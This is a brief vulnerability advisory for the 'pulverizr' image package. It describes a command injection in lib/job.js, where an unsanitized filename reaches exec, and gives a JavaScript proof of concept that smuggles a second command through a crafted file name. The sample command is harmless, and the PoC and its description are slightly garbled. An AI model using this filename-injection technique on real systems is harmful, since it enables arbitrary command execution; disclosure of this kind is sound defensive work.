# Overview

`pulverizr` is a to smash your images down to size, this package is vulnerable to Command Injection.

Within `lib/job.js`, the variable filename can be controlled by the attacker. This function uses the variable filename to construct the argument of the exec call without any sanitization.

In order to successfully exploit this vulnerability, an attacker will need to create a new file with the same name as the attack command.

# Proof of Concept

```
var root = require("pulverizr");
var fs = require("fs");
var attack_code = "touch Song";

var injection_code = "\"&" attack_code "&\"a.jpg"
var inputs = [injection_code]
fs.writeFile(injection_code, "123", function(){});

var job = root.createJob(inputs, {});
job.run();
```
